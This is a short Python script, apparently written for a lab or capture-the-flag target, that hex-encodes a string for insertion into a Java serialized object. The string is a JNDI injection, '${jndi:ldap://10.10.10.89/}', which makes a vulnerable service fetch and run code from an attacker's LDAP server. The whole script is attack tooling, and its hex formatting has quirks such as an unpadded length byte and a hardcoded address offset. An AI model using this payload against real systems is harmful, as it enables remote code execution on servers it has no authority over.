# This script helps to build the right hexadecimal/binary payload 
# for a Java serialized String attribute.
# Prints payload for further parsing.

# This function a hexadecimal string of the converted payload
def build_hex_payload(string):

    # A Java serialized String attribute contains the length of its String
    hex_payload = hex( len(string))[2:]

    turns = 1
    
    for each in string:
        
        # Get ASCII hexadecimal value of each character 
        # ord() returns ASCII decimal value
        converted = hex( ord(each))[2:]
         
        hex_payload += converted
        
        # Split into groups of 2 bytes delimited  by whitespace
        if turns % 2 == 1:
            hex_payload += "\ "

        # New adddress block for each 16 bytes
        if turns % 15 == 0:
            hex_payload += "\\n00000050:\ "

        turns += 1

    return hex_payload

# JNDI request to LDAP server as String
payload  = "${jndi:ldap://10.10.10.89/}"
print( build_hex_payload(payload)[:-2])
